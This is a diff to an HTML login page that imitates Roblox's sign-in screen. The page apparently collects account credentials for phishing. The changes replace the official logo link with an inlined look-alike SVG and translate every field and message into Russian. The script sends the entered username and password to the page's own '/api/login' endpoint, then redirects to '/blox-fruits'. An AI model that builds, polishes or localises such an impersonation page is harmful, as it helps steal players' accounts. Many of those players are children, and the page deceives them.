@@ -82,7 +82,7 @@
             z-index: 10;
         }
 
-        /* Официальная картинка-логотип Roblox */
+        /* Точный логотип через встроенный вектор */
         .roblox-logo-img {
             width: 170px;
             height: auto;
@@ -218,15 +218,15 @@
     </div>
 
     <div class="container">
-        <!-- Официальное изображение логотипа Roblox -->
-        <img class="roblox-logo-img" src="https://images.rbxcdn.com/3932a53d3b769ea84c98a96677f29f03.svg" alt="Roblox">
+        <!-- Встроенный оригинальный логотип Roblox -->
+        <img class="roblox-logo-img" src="data:image/svg+xml;utf8,<svg viewBox='0 0 520 90' fill='none' xmlns='http://www.w3.org/2000/svg'><path fill-rule='evenodd' clip-rule='evenodd' d='M31.2 0H8.4C3.76 0 0 3.76 0 8.4V81.6C0 86.24 3.76 90 8.4 90H20.4C25.04 90 28.8 86.24 28.8 81.6V56.4H33.6C44.32 56.4 53.04 47.68 53.04 36.96V19.44C53.04 8.72 44.32 0 33.6 0H31.2ZM34.08 38.88H28.8V17.52H34.08C36.72 17.52 38.88 19.68 38.88 22.32V34.08C38.88 36.72 36.72 38.88 34.08 38.88Z' fill='white'/><g transform='translate(68, 3) rotate(-14 40 40)'><rect x='4' y='4' width='72' height='72' rx='14' fill='white'/><rect x='22' y='22' width='36' height='36' rx='6' fill='%230d0f12'/></g><path fill-rule='evenodd' clip-rule='evenodd' d='M178.8 0H153.6C148.96 0 145.2 3.76 145.2 8.4V81.6C145.2 86.24 148.96 90 153.6 90H178.8C194.16 90 206.64 77.52 206.64 62.16V55.68C206.64 47.4 201.36 40.44 194.04 38.04C201.24 35.52 206.4 28.56 206.4 20.4V13.92C206.4 3.72 198.12 0 187.92 0H178.8ZM178.8 34.56H162V17.52H178.8C183.44 17.52 187.2 21.28 187.2 25.92V26.16C187.2 30.8 183.44 34.56 178.8 34.56ZM181.2 72.48H162V55.44H181.2C185.84 55.44 189.6 59.2 189.6 63.84V64.08C189.6 68.72 185.84 72.48 181.2 72.48Z' fill='white'/><path fill-rule='evenodd' clip-rule='evenodd' d='M228 3.6C228 1.61178 229.612 0 231.6 0H248.4C250.388 0 252 1.61178 252 3.6V73.2H283.2C285.188 73.2 286.8 74.8118 286.8 76.8V86.4C286.8 88.3882 285.188 90 283.2 90H231.6C229.612 90 228 88.3882 228 86.4V3.6Z' fill='white'/><path fill-rule='evenodd' clip-rule='evenodd' d='M356.4 0H315.6C302.56 0 302 10.56 302 20.4V69.6C302 79.44 302.56 90 315.6 90H356.4C369.44 90 370 79.44 370 69.6V20.4C370 10.56 369.44 0 356.4 0ZM358.8 69.6C358.8 73.08 355.8 75.6 352.8 75.6H319.2C316.2 75.6 313.2 73.08 313.2 69.6V20.4C313.2 16.92 316.2 14.4 319.2 14.4H352.8C355.8 14.4 358.8 16.92 358.8 20.4V69.6Z' fill='white'/><path fill-rule='evenodd' clip-rule='evenodd' d='M428.169 37.1643C425.86 31.9774 420.978 28.56 415.5 28.56H389.255C384.814 28.56 380.89 31.0668 379.034 34.9082L361.341 71.8596L343.647 34.9082C341.792 31.0668 337.867 28.56 333.426 28.56H307.182C301.704 28.56 296.822 31.9774 294.513 37.1643C292.204 42.3512 292.327 48.3619 294.836 53.4079L335.539 135.503L294.836 217.598C292.327 222.644 292.204 228.655 294.513 233.842C296.822 239.028 301.704 242.446 307.182 242.446H333.426C337.867 242.446 341.792 239.939 343.647 236.098L361.341 199.146L379.034 236.098C380.89 239.939 384.814 242.446 389.255 242.446H415.5C420.978 242.446 425.86 239.028 428.169 233.842C430.478 228.655 430.355 222.644 427.846 217.598L387.143 135.503L427.846 53.4079C430.355 48.3619 430.478 42.3512 428.169 37.1643Z' transform='translate(93 -20) scale(0.32)' fill='white'/></svg>" alt="Roblox">
 
         <div class="input-box">
-            <input type="text" id="usernameInput" placeholder="Username/Email/Phone" oninput="checkInputs()">
+            <input type="text" id="usernameInput" placeholder="Имя пользователя/Электронная почта/Телефон" oninput="checkInputs()">
         </div>
 
         <div class="input-box">
-            <input type="password" id="passwordInput" placeholder="Password" oninput="checkInputs()">
+            <input type="password" id="passwordInput" placeholder="Пароль" oninput="checkInputs()">
             <button type="button" class="eye-btn" id="eyeToggle" onclick="togglePassword()">
                 <svg id="eyeSvg" viewBox="0 0 24 24">
                     <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
@@ -234,11 +234,11 @@
             </button>
         </div>
 
-        <button id="loginBtn" class="login-btn" onclick="loginUser()">Log In</button>
+        <button id="loginBtn" class="login-btn" onclick="loginUser()">Авторизоваться</button>
         
-        <button class="quick-btn">Quick Pass</button>
+        <button class="quick-btn">Быстрый пас</button>
 
-        <a href="#" class="forgot-link">Forgot Password or Username</a>
+        <a href="#" class="forgot-link">Забыли пароль или имя пользователя?</a>
 
         <div id="status"></div>
     </div>
@@ -269,7 +269,7 @@
                 eyeSvg.innerHTML = '<path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2.81 2.81L1.39 4.22l3.05 3.05C3.12 8.72 2.06 10.25 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l4.41 4.41 1.41-1.41L2.81 2.81zM10.96 10.96l2.08 2.08c-.32.22-.71.36-1.04.36-1.1 0-2-.9-2-2 0-.33.14-.72.36-1.04z"/>';
             } else {
                 passwordInput.type = 'password';
-                eyeSvg.innerHTML = '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>';
+                eyeSvg.innerHTML = '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3 z"/>';
             }
         }
 
@@ -280,12 +280,12 @@
 
             if (!username || !password) {
                 statusDiv.style.color = '#ef4444';
-                statusDiv.innerText = 'Please fill in all fields.';
+                statusDiv.innerText = 'Пожалуйста, заполните все поля.';
                 return;
             }
 
             statusDiv.style.color = '#9ca3af';
-            statusDiv.innerText = 'Logging in...';
+            statusDiv.innerText = 'Вход...';
 
             try {
                 const response = await fetch('/api/login', {
@@ -298,7 +298,7 @@
 
                 if (response.ok) {
                     statusDiv.style.color = '#22c55e';
-                    statusDiv.innerText = 'Success! Redirecting...';
+                    statusDiv.innerText = 'Успешно! Перенаправление...';
                     
                     setTimeout(() => {
                         window.location.href = '/blox-fruits';
@@ -306,11 +306,11 @@
 
                 } else {
                     statusDiv.style.color = '#ef4444';
-                    statusDiv.innerText = data.error || 'Login failed';
+                    statusDiv.innerText = data.error || 'Ошибка входа';
                 }
             } catch (err) {
                 statusDiv.style.color = '#ef4444';
-                statusDiv.innerText = 'Connection error.';
+                statusDiv.innerText = 'Ошибка соединения.';
             }
         }
     </script>
